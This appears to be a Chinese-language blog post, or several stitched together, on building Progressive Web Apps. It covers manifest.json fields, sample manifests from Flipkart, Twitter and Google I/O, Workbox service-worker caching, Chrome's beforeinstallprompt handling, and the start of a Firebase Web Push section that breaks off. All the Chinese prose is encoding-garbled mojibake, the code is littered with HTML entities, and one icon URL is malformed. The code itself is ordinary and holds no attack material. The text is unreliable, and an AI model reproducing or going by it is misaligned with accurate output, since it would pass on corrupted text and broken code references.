æ‡‰ç”¨ç¨‹å¼çš„ä½¿ç”¨ç¯„åœï¼Œé€™é …å¦‚æœæœ‰å¡«ï¼Œé‚£æ‡‰ç”¨ç¨‹å¼çš„ä½œç”¨åŸŸå°±æœƒé™åœ¨æŒ‡å®šçš„ç›®éŒ„è£¡ï¼Œè¶…éæŒ‡å®šç›®éŒ„ï¼Œå°±æœƒç•¶æˆä¸€èˆ¬çš„ç¶²é ç€è¦½ã€‚\n1 \u0026#34;scope\u0026#34;: \u0026#34;/myapp/\u0026#34; manifest.json åŸºæœ¬æª”æ¡ˆå…§å®¹ manifest è£¡çš„æˆå“¡ä¸æ˜¯æ¯é …éƒ½ä¸€å®šè¦å¡«å¯«çš„ï¼Œä»¥ä¸‹é™„ä¸Š manifest.json çš„åŸºæœ¬æª”å…§å®¹ï¼š\nmanifest.json 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 { \u0026#34;short_name\u0026#34;: \u0026#34;Wayne\u0026#39;s blog\u0026#34;, \u0026#34;name\u0026#34;: \u0026#34;Wayne\u0026#39;s blog\u0026#34;, \u0026#34;description\u0026#34;: \u0026#34;å‰æ©çš„éƒ¨è½æ ¼ï¼Œç”¨æ–¼ç´€éŒ„coding lifeæŸ¥æ‰¾çš„è³‡æ–™ã€ç­†è¨˜èˆ‡æ–‡ç« ï¼Œçµ±æ•´èµ·ä¾†é™¤äº†è‡ªå·±ä½¿ç”¨ï¼Œä¹Ÿå¸Œæœ›å°å„ä½æœ‰å¹«åŠ©ã€‚\u0026#34;, \u0026#34;icons\u0026#34;: [ { \u0026#34;src\u0026#34;:\u0026#34;./apple-touch-icon-57x57.webp\u0026#34;, \u0026#34;sizes\u0026#34;: \u0026#34;57x57\u0026#34;, \u0026#34;type\u0026#34;: \u0026#34;image/webp\u0026#34; }, { \u0026#34;src\u0026#34;:\u0026#34;./apple-touch-icon-114x114.webp\u0026#34;, \u0026#34;sizes\u0026#34;: \u0026#34;114x114\u0026#34;, \u0026#34;type\u0026#34;: \u0026#34;image/webp\u0026#34; }, { \u0026#34;src\u0026#34;:\u0026#34;./apple-touch-icon-120x120.webp\u0026#34;, \u0026#34;sizes\u0026#34;: \u0026#34;120x120\u0026#34;, \u0026#34;type\u0026#34;: \u0026#34;image/webp\u0026#34; }, { \u0026#34;src\u0026#34;:\u0026#34;./apple-touch-icon-180x180.webp\u0026#34;, \u0026#34;sizes\u0026#34;: \u0026#34;180x180\u0026#34;, \u0026#34;type\u0026#34;: \u0026#34;image/webp\u0026#34; }, { \u0026#34;src\u0026#34;:\u0026#34;./apple-touch-icon-192x192.webp\u0026#34;, \u0026#34;sizes\u0026#34;: \u0026#34;192x192\u0026#34;, \u0026#34;type\u0026#34;: \u0026#34;image/webp\u0026#34; }, { \u0026#34;src\u0026#34;:\u0026#34;./apple-touch-icon-512x512.png\u0026#34;, \u0026#34;sizes\u0026#34;: \u0026#34;512x512\u0026#34;, \u0026#34;type\u0026#34;: \u0026#34;image/png\u0026#34; }, { \u0026#34;src\u0026#34;:\u0026#34;./maskable_icon.webp\u0026#34;, \u0026#34;sizes\u0026#34;: \u0026#34;512x512\u0026#34;, \u0026#34;type\u0026#34;: \u0026#34;image/webp\u0026#34;, \u0026#34;purpose\u0026#34;: \u0026#34;any maskable\u0026#34; } ], \u0026#34;lang\u0026#34;: \u0026#34;zh-Hant-TW\u0026#34;, \u0026#34;start_url\u0026#34;: \u0026#34;./?utm_source=web_app_manifest\u0026#34;, \u0026#34;background_color\u0026#34;: \u0026#34;#f5f5fa\u0026#34;, \u0026#34;theme_color\u0026#34;: \u0026#34;#57BCB9\u0026#34;, \u0026#34;display\u0026#34;: \u0026#34;standalone\u0026#34;, \u0026#34;orientation\u0026#34;: \u0026#34;landscape\u0026#34;, \u0026#34;prefer_related_applications\u0026#34;: false } é—œæ–¼ã€ŒChrome ä¸»å‹•æç¤ºåŠ å…¥ä¸»ç•«é¢ã€ PWA èº«ç‚º Google çš„è¦ªèº«å…’å­ï¼Œåœ¨ Android æ‰‹æ©Ÿæ˜¯å¾ˆæœ‰åƒé¦™çš„é»ã€‚\né é¢å¼•ç”¨äº† manifest.json å¾Œï¼Œä½¿ç”¨è€…åœ¨æ‰‹æ©Ÿä¸Šé»é¸åŠ å…¥ä¸»ç•«é¢ï¼Œé é¢å°±å¯ä»¥åƒ App ä¸€æ¨£é¡¯ç¤ºåœ¨æ‰‹æ©Ÿçš„ä¸»ç•«é¢ä¸Šã€‚\nä½†å¾ˆå¤šä½¿ç”¨è€…å…¶å¯¦ä¸çŸ¥é“æœ‰é€™åŠŸèƒ½ï¼Œæˆ–æ˜¯çŸ¥é“äº†ä¹Ÿä¸å¸¸æœƒå»æŒ‰ã€‚\nè²¼å¿ƒçš„ Google é‡å°é€™é»åšäº†ä¸€é …æªæ–½ï¼Œå°±æ˜¯ä¸»å‹•è©¢å•ä½¿ç”¨è€…è¦ä¸è¦å°‡é é¢åŠ å…¥ä¸»ç•«é¢ã€‚\næ ¹æ“š Google çš„èªªæ˜æ–‡ä»¶ï¼šAdd to Home Screenï¼Œè§¸ç™¼ Chrome ä¸»å‹•è©¢å•æ˜¯å¦åŠ å…¥ä¸»ç•«é¢çš„æ¢ä»¶å¦‚ä¸‹ï¼š\nä½¿ç”¨è€…é‚„æ²’åŠ å…¥ä¸»ç•«é¢ åœ¨æœ‰ manifes.json çš„ç¶²åŸŸä¸‹ï¼Œäº’å‹•äº†è‡³å°‘ 30 ç§’ manifset.json è£¡æœ‰å¹¾é …æˆå“¡ä¸€å®šè¦æœ‰ï¼šname æˆ– short_nameã€iconsã€start_urlã€display é é¢è¦æ˜¯ https é é¢æœ‰è£ service-workerï¼ˆsw.jsï¼‰ï¼Œè£¡é¢æœ‰ç›£è½ä¸¦è™•ç† beforeinstallprompt äº‹ä»¶ ç¬¬ 5 é»ï¼Œæ˜¯å¦è¦æœ‰å¯« beforeinstallpromptï¼Œå¥½åƒä¸æ˜¯å¿…å¡«é …ç›®ï¼Œå³ä¾¿æ²’å¡«ï¼Œåœ¨æ¸¬è©¦æ™‚ä¹Ÿæœƒåœ¨åº•éƒ¨å‡ºç¾ä¸€æ¢è©¢å•æ¡†ã€‚\nåœ¨åƒè€ƒäº†é€™ç¯‡ä»¥å¾Œï¼šPWA å¯¦æˆ°ç¶“é©—åˆ†äº«\nç™¼ç¾åˆ¥äººæ˜¯ç”¨åœ¨ UX ä¸Šæ›´å„ªåŒ–çš„åœ°æ–¹ï¼Œå°±æ˜¯è‡ªå·±é¸æ“‡è¦å‡ºç¾è©¢å•æ¡†æ™‚ç”¨çš„ã€‚\nmanifest è§€æ‘© æˆ‘å€‘ä¾†çœ‹çœ‹å¹¾å€‹çŸ¥åçš„ PWA éƒ½æ˜¯æ€éº¼å¯«ä»–å€‘çš„ manifest.jsonã€‚\nç¬¬ä¸€å€‹æ˜¯ PWA ç•Œä¸­å¾ˆæœ‰åçš„ flipkartï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 { \u0026#34;name\u0026#34;: \u0026#34;Flipkart Lite\u0026#34;, \u0026#34;short_name\u0026#34;: \u0026#34;Flipkart Lite\u0026#34;, \u0026#34;icons\u0026#34;: [ { \u0026#34;src\u0026#34;: \u0026#34;https:/https://static.coderbridge.com/img/techbridge/images1a.flixcart.com/www/linchpin/batman-returns/logo_lite-cbb3574d.png\u0026#34;, \u0026#34;sizes\u0026#34;: \u0026#34;192x192\u0026#34;, \u0026#34;type\u0026#34;: \u0026#34;image/png\u0026#34; } ], \u0026#34;gcm_sender_id\u0026#34;: \u0026#34;656085505957\u0026#34;, \u0026#34;gcm_user_visible_only\u0026#34;: true, \u0026#34;start_url\u0026#34;: \u0026#34;/?start_url=homescreenicon\u0026#34;, \u0026#34;permissions\u0026#34;: [ \u0026#34;gcm\u0026#34; ], \u0026#34;orientation\u0026#34;: \u0026#34;portrait\u0026#34;, \u0026#34;display\u0026#34;: \u0026#34;standalone\u0026#34;, \u0026#34;theme_color\u0026#34;: \u0026#34;#2874f0\u0026#34;, \u0026#34;background_color\u0026#34;: \u0026#34;#2874f0\u0026#34; } å†ä¾†æ˜¯é¼é¼å¤§åçš„ twitterï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 { \u0026#34;background_color\u0026#34;: \u0026#34;#ffffff\u0026#34;, \u0026#34;description\u0026#34;: \u0026#34;It\u0026#39;s what\u0026#39;s happening. From breaking news and entertainment, sports and politics, to big events and everyday interests.\u0026#34;, \u0026#34;display\u0026#34;: \u0026#34;standalone\u0026#34;, \u0026#34;gcm_sender_id\u0026#34;: \u0026#34;49625052041\u0026#34;, \u0026#34;gcm_user_visible_only\u0026#34;: true, \u0026#34;icons\u0026#34;: [ { \u0026#34;src\u0026#34;: \u0026#34;https://abs.twimg.com/responsive-web/web/ltr/icon-default.604e2486a34a2f6e.png\u0026#34;, \u0026#34;sizes\u0026#34;: \u0026#34;192x192\u0026#34;, \u0026#34;type\u0026#34;: \u0026#34;image/png\u0026#34; }, { \u0026#34;src\u0026#34;: \u0026#34;https://abs.twimg.com/responsive-web/web/ltr/icon-default.604e2486a34a2f6e.png\u0026#34;, \u0026#34;sizes\u0026#34;: \u0026#34;512x512\u0026#34;, \u0026#34;type\u0026#34;: \u0026#34;image/png\u0026#34; } ], \u0026#34;name\u0026#34;: \u0026#34;Twitter\u0026#34;, \u0026#34;share_target\u0026#34;: { \u0026#34;action\u0026#34;: \u0026#34;compose/tweet\u0026#34;, \u0026#34;params\u0026#34;: { \u0026#34;title\u0026#34;: \u0026#34;title\u0026#34;, \u0026#34;text\u0026#34;: \u0026#34;text\u0026#34;, \u0026#34;url\u0026#34;: \u0026#34;url\u0026#34; } }, \u0026#34;short_name\u0026#34;: \u0026#34;Twitter\u0026#34;, \u0026#34;start_url\u0026#34;: \u0026#34;/\u0026#34;, \u0026#34;theme_color\u0026#34;: \u0026#34;#ffffff\u0026#34;, \u0026#34;scope\u0026#34;: \u0026#34;/\u0026#34; } æœ€å¾Œå‰‡æ˜¯ Google I/O 2018ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 { \u0026#34;name\u0026#34;: \u0026#34;Google I/O 2018\u0026#34;, \u0026#34;short_name\u0026#34;: \u0026#34;I/O 2018\u0026#34;, \u0026#34;start_url\u0026#34;: \u0026#34;./?utm_source=web_app_manifest\u0026#34;, \u0026#34;display\u0026#34;: \u0026#34;standalone\u0026#34;, \u0026#34;theme_color\u0026#34;: \u0026#34;#6284F3\u0026#34;, \u0026#34;background_color\u0026#34;: \u0026#34;#6284F3\u0026#34;, \u0026#34;icons\u0026#34;: [{ \u0026#34;src\u0026#34;: \u0026#34;static/images/homescreen/homescreen57.png\u0026#34;, \u0026#34;sizes\u0026#34;: \u0026#34;57x57\u0026#34;, \u0026#34;type\u0026#34;: \u0026#34;image/png\u0026#34; }, { \u0026#34;src\u0026#34;: \u0026#34;static/images/homescreen/homescreen114.png\u0026#34;, \u0026#34;sizes\u0026#34;: \u0026#34;114x114\u0026#34;, \u0026#34;type\u0026#34;: \u0026#34;image/png\u0026#34; }, { \u0026#34;src\u0026#34;: \u0026#34;static/images/homescreen/homescreen128.png\u0026#34;, \u0026#34;sizes\u0026#34;: \u0026#34;128x128\u0026#34;, \u0026#34;type\u0026#34;: \u0026#34;image/png\u0026#34; }, { \u0026#34;src\u0026#34;: \u0026#34;static/images/homescreen/homescreen144.png\u0026#34;, \u0026#34;sizes\u0026#34;: \u0026#34;144x144\u0026#34;, \u0026#34;type\u0026#34;: \u0026#34;image/png\u0026#34; }, { \u0026#34;src\u0026#34;: \u0026#34;static/images/homescreen/homescreen192.png\u0026#34;, \u0026#34;sizes\u0026#34;: \u0026#34;192x192\u0026#34;, \u0026#34;type\u0026#34;: \u0026#34;image/png\u0026#34; }, { \u0026#34;src\u0026#34;: \u0026#34;static/images/homescreen/homescreen512.png\u0026#34;, \u0026#34;sizes\u0026#34;: \u0026#34;512x512\u0026#34;, \u0026#34;type\u0026#34;: \u0026#34;image/png\u0026#34; }], \u0026#34;prefer_related_applications\u0026#34;: false, \u0026#34;related_applications\u0026#34;: [{ \u0026#34;platform\u0026#34;: \u0026#34;play\u0026#34;, \u0026#34;id\u0026#34;: \u0026#34;com.google.samples.apps.iosched\u0026#34; }], \u0026#34;gcm_sender_id\u0026#34;: \u0026#34;103953800507\u0026#34; } æˆ‘æ»¿å–œæ­¡è§€å¯Ÿåˆ¥äººå®¶çš„é€™äº›æ±è¥¿ï¼Œå› ç‚ºä½ æœƒç™¼ç¾å¾ˆå¤šä½ æŸ¥è³‡æ–™æ™‚éºæ¼æˆ–æ˜¯æ ¹æœ¬æ‰¾ä¸åˆ°çš„è³‡è¨Šï¼Œè€Œä¸”é€™äº›çœ‹ä¹…äº†ä½ ä¹Ÿæœƒæœ‰å€‹æ¦‚å¿µï¼ŒçŸ¥é“å“ªäº›å±¬æ€§ç‰¹åˆ¥å¸¸ç”¨ï¼Œé™¤äº† manifest.json ä»¥å¤–ï¼Œä¹Ÿå¯ä»¥åƒè€ƒ html è£¡é¢çš„ tagï¼Œä¸€æ¨£èƒ½å­¸ç¿’åˆ°å¾ˆå¤šã€‚\nService Worker ä»‹ç´¹ åŠ å…¥ Service Worker çš„ç›®çš„å°±åªæœ‰ä¸€å€‹ï¼Œé‚£å°±æ˜¯å¿«å–ã€‚é€é Service Workerï¼ˆä»¥ä¸‹ç°¡ç¨± SWï¼‰ï¼Œå¯ä»¥å¹«åŠ©æˆ‘å€‘åœ¨ç™¼é€ request ä¹‹å‰å°±å…ˆæ””æˆªåˆ°ä¸¦ä¸”åšè™•ç†ï¼Œè€Œé›¢ç·šé‹è¡Œçš„åŸç†ä¹Ÿæ˜¯é€™æ¨£çš„ï¼Œæˆ‘å€‘å…ˆåœ¨ç¬¬ä¸€æ¬¡é–‹å•Ÿæ™‚è¨»å†Š SWï¼Œä¸¦ä¸”åˆ©ç”¨ SW ä¸‹è¼‰éœæ…‹æª”æ¡ˆä¸¦å¿«å–ä½ï¼Œä¹‹å¾Œè‹¥ä½¿ç”¨è€…é›¢ç·šï¼Œæˆ‘å€‘å†ç”¨å·²ç¶“å¿«å–ä½çš„æª”æ¡ˆä¾†å›è¦†ï¼Œå°±ä¸æœƒç™¼é€çœŸçš„ requestï¼Œè‡ªç„¶ä¹Ÿä¸æœƒç™¼ç”Ÿç„¡æ³•é€£ç·šçš„æƒ…æ³ã€‚\nè€Œ Google æœ‰æä¾›äº†ä¸€å€‹æ–¹ä¾¿çš„å·¥å…·ï¼šWorkbox ä¾†å¹«åŠ©æˆ‘å€‘è‡ªå‹•ç”¢ç”Ÿå‡º SW ä»¥åŠåˆ©ç”¨æ›´æ–¹ä¾¿çš„èªæ³•ä¾†æ””æˆª requestã€‚\nèˆ‰ä¾‹ä¾†èªªï¼Œæˆ‘è‡ªå·±ç”¨çš„æ˜¯ Webpack çš„ pluginï¼š\n1 2 3 4 5 6 7 8 9 10 new workboxPlugin.InjectManifest({ swSrc: path.join(__dirname, \u0026#39;..\u0026#39;, SRC_DIR, \u0026#39;sw.js\u0026#39;), swDest: path.join(__dirname, \u0026#39;..\u0026#39;, DIST_DIR, \u0026#39;sw.js\u0026#39;), globDirectory: path.join(__dirname, \u0026#39;..\u0026#39;, DIST_DIR), globPatterns: [\u0026#39;**/*.{js,css}\u0026#39;] }), //sw.js let precacheList = self.__precacheManifest || [] workbox.precaching.precacheAndRoute(precacheList) åªè¦é€™æ¨£ä¸€å¯«ï¼Œå°±æœƒè‡ªå‹•å»æ‰¾ç¬¦åˆè¦å‰‡çš„æª”æ¡ˆä¸¦ä¸”åŠ å…¥å¿«å–æ¸…å–®è£¡é¢ï¼Œä½ åªè¦ä¸€è¨»å†Š SW çš„æ™‚å€™å°±æœƒæŠŠé‚£äº›æª”æ¡ˆçµ¦å¿«å–èµ·ä¾†ã€‚\né™¤æ­¤ä¹‹å¤–å‘¢ï¼ŒWorkbox ä¹Ÿå¯ä»¥é‡å° URL ä¾†ç›£è½ï¼š\nsw.js 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 // sw.js workbox.routing.registerRoute(/(https?:\\/\\/)(.*)\\/api\\/(.*)/, args =\u0026gt; workbox.strategies .networkFirst({ cacheName: \u0026#39;data-cache\u0026#39;, plugins: [ new workbox.expiration.Plugin({ maxEntries: 100, maxAgeSeconds: 2592000 }) ] }) .handle(args) .then(response =\u0026gt; { return response }) .catch(err =\u0026gt; { console.log(\u0026#39;err:\u0026#39;, err) }) ) åƒä¸Šé¢çš„ç¨‹å¼ç¢¼å°±æ˜¯é‡å°è·¯å¾‘ä¸­å«æœ‰ api çš„ request åšå¿«å–ï¼Œé€™æ¨£åœ¨é›¢ç·šæ™‚ä¹Ÿå¯ä»¥åˆ©ç”¨ä»¥å‰å¿«å–ä½çš„ API responseã€‚\nWorkbox é‡å°é€™ç¨®å‹•æ…‹çš„å¿«å–æä¾›å¹¾ç¨®ç­–ç•¥ï¼Œåˆ†åˆ¥æ˜¯ï¼šstaleWhileRevalidateã€cacheFirstã€networkFirstã€networkOnlyèˆ‡cacheOnlyï¼Œå…¶å¯¦çœ‹åå­—å°±å¯ä»¥å¤§æ¦‚ç†è§£ç­–ç•¥æ˜¯ä»€éº¼äº†ï¼Œæƒ³çŸ¥é“è©³ç´°çš„å…§å®¹å¯ä»¥åƒè€ƒå®˜æ–¹æ–‡ä»¶ï¼šWorkbox Strategiesã€‚\nç¸½ä¹‹è‡ªå¾æœ‰äº† Workbox ä¹‹å¾Œï¼ŒåŸºæœ¬ä¸Šå°±ä¸ç”¨è‡ªå·±æ‰‹å¯« SW äº†ï¼Œéƒ½é è‘—å®ƒæä¾›çš„ API ä»¥åŠåŠŸèƒ½å°±è¡Œäº†ï¼Œå°±å¯ä»¥è‡ªå‹•ç”¢ç”Ÿå‡ºç¬¦åˆéœ€æ±‚çš„ SWã€‚\nAdd to home screen banner æœ€å¾Œè¦ä¾†è«‡çš„æ˜¯ã€Œå®‰è£ PWAã€é€™ä¸€å¡Šï¼Œåœ¨ iOS Safari ä¸Šé¢åˆ¥ç„¡ä»–æ³•ï¼Œå°±åªèƒ½è‡ªå·±å«å‡ºé¸å–®ç„¶å¾Œé¸å–ã€ŒAdd to home screenã€ï¼Œå¯æ˜¯åœ¨ Android Chrome ä¸Šé¢ï¼Œå¦‚æœä½ ç¬¦åˆä¸€å®šçš„æ¢ä»¶ï¼ˆæœ‰è¨­ç½® mainfest.json ä»¥åŠæœ‰è¨»å†Š Service Workerï¼‰ï¼Œå°±æœƒè‡ªå‹•å¹«ä½ è·³å‡ºä¸€å€‹å¯æ„›çš„ Install bannerã€‚\nï¼ˆåœ–ç‰‡ä¾†è‡ªï¼šChanges to Add to Home Screen Behaviorï¼‰\næ ¹æ“š Chrome ç‰ˆæœ¬çš„ä¸åŒï¼Œè¡Œç‚ºä¹Ÿæœ‰æ‰€ä¸åŒã€‚\nåœ¨ Chrome 67ï¼ˆå«ï¼‰ä»¥å‰çš„ç‰ˆæœ¬ï¼Œå¦‚æœä½ åœ¨ beforeinstallprompt äº‹ä»¶è£¡é¢æ²’æœ‰ç‰¹åˆ¥ç”¨ preventDefault()ï¼Œæˆ–æ˜¯é¡¯å¼çš„å‘¼å«äº† prompt()ï¼Œå°±æœƒå‡ºç¾æœ€å·¦é‚Šé‚£å€‹é —å¤§çš„ A2HS bannerã€‚\nç„¶å¾Œåœ¨ Chrome 68ï¼ˆå«ï¼‰ä¹‹å¾Œçš„ç‰ˆæœ¬ï¼Œç„¡è«–ä½ åšäº†ä»€éº¼ï¼Œç³»çµ±éƒ½æœƒè‡ªå‹•å‡ºç¾é‚£å€‹ Mini-infobarï¼Œä½†å¦‚æœä½¿ç”¨è€…é—œæ‰çš„è©±ï¼Œè¦éš”ä¸‰å€‹æœˆæ‰æœƒå†å‡ºç¾ä¸€æ¬¡ï¼Œå¯¦åœ¨æ˜¯æœ‰å¤ ä¹…ã€‚\næ¥è‘—å‘¢ï¼Œä¸Šé¢é€™å…©å€‹ A2HS banner è·Ÿ Mini-infobarï¼Œä½¿ç”¨è€…é»æ“Šä¹‹å¾Œéƒ½æœƒå‡ºç¾æœ€å³é‚Šçš„ A2HS Dialogï¼Œæç¤ºä½¿ç”¨è€…è¦ä¸è¦å®‰è£ PWAã€‚\nä½†æ˜¯åœ¨ Chrome 68 ä»¥å¾Œï¼Œä½ ä¹Ÿå¯ä»¥åˆ©ç”¨ç¨‹å¼å»å‘¼å« beforeinstallprompt è£¡é¢æ‹¿åˆ°çš„ event.prompt() æŠŠé€™å€‹ dialog é¡¯ç¤ºå‡ºä¾†ã€‚\nè½èµ·ä¾†æœ‰é»è¤‡é›œå°å§ï¼Ÿ\nå…ˆä¾†ä»‹ç´¹ beforeinstallprompt é€™å€‹ event å¥½äº†ï¼Œé€™å€‹ event åœ¨ä¸€åˆ‡éƒ½æº–å‚™å°±ç·’ï¼Œç¢ºèªä½ æ»¿è¶³æ¢ä»¶å¯ä»¥é¡¯ç¤º prompt çš„æ™‚å€™æœƒè¢«è§¸ç™¼ï¼Œæœƒå‚³ä¾†ä¸€å€‹ eventï¼Œä½ å¯ä»¥é˜»æ­¢é¡¯ç¤º promptï¼ŒæŠŠé€™å€‹ event å­˜èµ·ä¾†ï¼š\n1 2 3 4 5 6 7 8 9 10 11 // æ­¤ç¯„ä¾‹ä¾†è‡ªä¸Šé¢çš„å®˜æ–¹æ–‡ä»¶ let installPromptEvent; window.addEventListener(\u0026#39;beforeinstallprompt\u0026#39;, (event) =\u0026gt; { // Prevent Chrome \u0026lt;= 67 from automatically showing the prompt event.preventDefault(); // Stash the event so it can be triggered later. installPromptEvent = event; // Update the install UI to notify the user app can be installed document.querySelector(\u0026#39;#install-button\u0026#39;).disabled = false; }); ç‚ºä»€éº¼è¦å­˜èµ·ä¾†å‘¢ï¼Ÿå› ç‚ºä½¿ç”¨è€…å¯èƒ½ä¸æƒ³ä¸€æ‰“é–‹ç¶²ç«™å°±çœ‹åˆ°é€™å€‹å½ˆçª—ï¼Œæˆ–è€…ä»–å¯èƒ½æ­£åœ¨çµå¸³çµæœä½ è·³é€™å€‹æ±è¥¿ä¾†å¹²æ“¾ä»–ï¼Œæ‰€ä»¥å…ˆæŠŠå®ƒå­˜èµ·ä¾†ï¼Œç­‰é©ç•¶çš„æ™‚æ©Ÿå†å‘¼å« installPromptEvent.prompt() ä¾†è·³å‡º Dialogã€‚\nä½†è¦æ³¨æ„çš„äº‹æƒ…æ˜¯ä½ ç›´æ¥å‘¼å« installPromptEvent.prompt() æ˜¯æ²’ç”¨çš„ï¼Œä½ å¿…é ˆè¦ within a user gestureï¼Œæ„æ€å°±æ˜¯ä½ è¦æ”¾åœ¨æŒ‰éˆ•çš„ click äº‹ä»¶ï¼ˆæˆ–å…¶ä»–ç”±ä½¿ç”¨è€…è§¸ç™¼çš„äº‹ä»¶ï¼‰è£¡æ‰æœ‰æ•ˆï¼Œç›´æ¥å‘¼å«æ˜¯æ²’æœ‰ç”¨çš„ï¼Œè€Œä¸”æœƒçœ‹åˆ° console è·³å‡ºéŒ¯èª¤è¨Šæ¯ã€‚\næˆ‘ä¹‹å‰ä¸€åº¦å¾ˆå¥½å¥‡å®ƒæ˜¯æ€éº¼åšåˆ¤æ–·çš„ï¼Œå¾Œä¾†ç™¼ç¾åŸä¾†æœ‰ event.isTrusted å¯ä»¥ç”¨ï¼Œå¯ä»¥åˆ¤æ–·ä¸€å€‹äº‹ä»¶æ˜¯ä¸æ˜¯è¢«ä½¿ç”¨è€…ä¸»å‹•è§¸ç™¼çš„ï¼Œåƒè€ƒè³‡æ–™ï¼šMDN - Event.isTrustedã€‚\nç¸½ä¹‹å‘¢ï¼Œå› ç‚ºåœ¨ä¸åŒç‰ˆæœ¬ä¸Šçš„ Chrome æœ‰ä¸åŒè¡Œç‚ºï¼Œæ‰€ä»¥æœ€å¾Œæˆ‘å€‘æ±ºå®šç”¨ä¸‹é¢çš„ç¨‹å¼ç¢¼é‡å°ä¸åŒç‰ˆæœ¬æœ‰ä¸åŒçš„åæ‡‰ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 // æŠŠ event å­˜èµ·ä¾† var installPromptEvent // è¦é¡¯ç¤º prompt çš„å»¶é² var showTime = 30 * 1000 window.addEventListener(\u0026#39;beforeinstallprompt\u0026#39;, function (e) { e.preventDefault() installPromptEvent = e var data = navigator.userAgent.match(/Chrom(e|ium)\\\\/([0-9]+)\\\\./) var version = (data \u0026amp;\u0026amp; data.length \u0026gt;= 2) ? parseInt(data[2], 10) : null if (version \u0026amp;\u0026amp; installPromptEvent.prompt) { // å»¶é²ä¸€æ®µæ™‚é–“æ‰é¡¯ç¤º prompt setTimeout(function() { // å¦‚æœ Chrome ç‰ˆæœ¬æ˜¯ 67ï¼ˆå«ï¼‰ä»¥ä¸‹ï¼Œå¯ä»¥ç›´æ¥å‘¼å« if (version \u0026lt;= 67) { installPromptEvent.prompt() return } // å¦å‰‡çš„è©±å¿…é ˆé€é user action ä¸»å‹•è§¸ç™¼ // é€™é‚Šå¹« #root åŠ ä¸Š event listenerï¼Œä»£è¡¨é»æ“Šè¢å¹•ä»»ä½•ä¸€è™•éƒ½æœƒé¡¯ç¤º prompt document.querySelector(\u0026#39;#root\u0026#39;).addEventListener(\u0026#39;click\u0026#39;, addToHomeScreen) }, showTime) } }); function addToHomeScreen(e) { if (installPromptEvent) { installPromptEvent.prompt() installPromptEvent = null document.querySelector(\u0026#39;#root\u0026#39;).removeEventListener(\u0026#39;click\u0026#39;, addToHomeScreen) } } å¦‚æœæ˜¯ 67 ä»¥ä¸‹ï¼Œç›´æ¥å‘¼å«å°±å¯ä»¥é¡¯ç¤º promptï¼Œå¦å‰‡çš„è©±é‚„è¦å†ä¸€æ­¥ï¼Œè¦åŠ å€‹ event listener æ‰è¡Œï¼Œè€Œæˆ‘å€‘ä¹Ÿé¸æ“‡å»¶é² 30 ç§’æ‰é¡¯ç¤ºã€‚\nå‡ºä¹æ„æ–™åœ°ï¼Œé€™æ¨£ä¸€å€‹å°æ”¹å‹•å¸¶ä¾†é©šäººçš„æˆé•·ï¼ŒåŸæœ¬ä¸€å¤©å¤§æ¦‚æ‰ 20ã€30 å€‹äººå®‰è£ PWAï¼Œç¶“éé€™æ¨£èª¿æ•´ä¹‹å¾Œç¬é–“è®Šæˆå…«åˆ°åå€ï¼Œçœ‹åˆ° GA çš„é‚£å€‹çµ±è¨ˆåœ–æˆ‘ä¹Ÿåš‡äº†ä¸€è·³ï¼Œæ²’æƒ³åˆ°æ•ˆæœé€™éº¼å¥½ã€‚\nèˆ‡å…¶ä¸€ç›´ç©æ¥µåœ°è¦åˆ¥äººå¿«é»å®‰è£ PWAï¼Œé‚„ä¸å¦‚åªè¦æ±‚çœŸçš„å°ä½ ç”¢å“æœ‰èˆˆè¶£ï¼ˆåœç•™è¶…é 30 ç§’é˜ï¼‰çš„äººã€‚\nç”¨ Firebase åš Web Push ç”¨åˆ°çš„è³‡æº Web Push æ¨æ’­åŠŸèƒ½ï¼Œé€™é™£å­å¾ˆå¸¸çœ‹åˆ°çš„ä¸€å€‹åŠŸèƒ½ï¼Œå¦‚æœä¸€é€²å…¥ç¶²ç«™ï¼Œçœ‹åˆ°ç¶²ç«™è¦æ±‚é¡¯ç¤ºé€šçŸ¥çš„æ¬Šé™ï¼Œå°±ä»£è¡¨é€™å€‹ç¶²ç«™æœ‰ç”¨é€™åŠŸèƒ½ï¼š\né‚£é€šå¸¸ï¼Œå¾ˆå¤šç¶²ç«™ UX è¨­è¨ˆä¸è‰¯ï¼Œåœ¨ä½¿ç”¨è€…æ ¹æœ¬å°±é‚„æä¸æ¸…æ¥šé€™ç¶²ç«™æ˜¯å¹¹éº»çš„æƒ…æ³ä¸‹å°±è·³é€šçŸ¥ï¼Œæ‰€ä»¥å¤§éƒ¨ä»½éƒ½ç›´æ¥æŒ‰å°é–äº†å§ XDï¼Ÿ\nç¸½ä¹‹ï¼Œåœ¨è¸©äº†å¹¾å€‹å‘ä»¥å¾Œï¼Œçµ‚æ–¼å®Œæ•´çš„å¯«å‡ºäº† Web Push çš„åŠŸèƒ½ã€‚\nå®Œæ•´æ˜¯æŒ‡æœƒåœ¨æ¡Œæ©Ÿã€å®‰å“æ‰‹æ©Ÿç™¼å‡ºæ¨æ’­é€šçŸ¥ï¼Œä¸¦ä¸”é»äº†æœƒé€²åˆ°æŒ‡å®šçš„é é¢ï¼ŒåŒæ™‚åœ¨ Firebase å„²å­˜ç™¼é€è¨Šæ¯çš„è¨˜éŒ„ã€‚\nç”¨åˆ°çš„è³‡æºå¦‚ä¸‹ï¼š\nè³‡æ–™åº«ï¼šFirebase Realtime Database æ¨æ’­åŠŸèƒ½ï¼šFirebase Cloud Messaging JS frameworkï¼šVue.js Web Push æ˜¯ PWA ä¸€å€‹å¾ˆé‡è¦çš„åŠŸèƒ½ï¼\nå–å¾— FCM é‡‘é‘° æœ¬ç¯‡æ˜¯ç”¨ Firebase çš„ Cloud MessagingåŠŸèƒ½ï¼ˆä»¥ä¸‹ç¨± FCMï¼‰ï¼Œå»å¯¦ä½œ Web Pushã€‚æ‰€ä»¥ç¬¬ä¸€æ­¥æ˜¯è¦å…ˆåœ¨ Firebase 